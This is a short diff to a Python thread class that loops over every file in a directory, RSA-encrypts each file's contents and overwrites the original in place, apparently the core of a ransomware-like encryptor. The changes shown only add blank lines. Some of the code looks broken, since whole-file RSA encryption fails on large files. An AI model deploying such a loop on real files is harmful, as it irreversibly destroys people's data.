@@ -21,6 +21,7 @@ class EncrypterThread(threading.Thread):
     def run(self):
         files_count: int = (len(os.listdir(self._dir)))
         for file_num, file in enumerate(os.listdir(self._dir)):
+
             if self._stop:
                 print("Encrypshion was stoped")
                 break
@@ -28,8 +29,10 @@ class EncrypterThread(threading.Thread):
             sleep(1)
             with open(f"{self._dir}\\{file}", "rb") as f:
                 data = rsa.encrypt(f.read(), public_key)
+
             with open(f"{self._dir}\\{file}", "wb") as f:
                 f.write(data)
+
             print(
                 f"File {file} was encruptad! Files left {files_count-file_num-1}/{files_count}"
             )
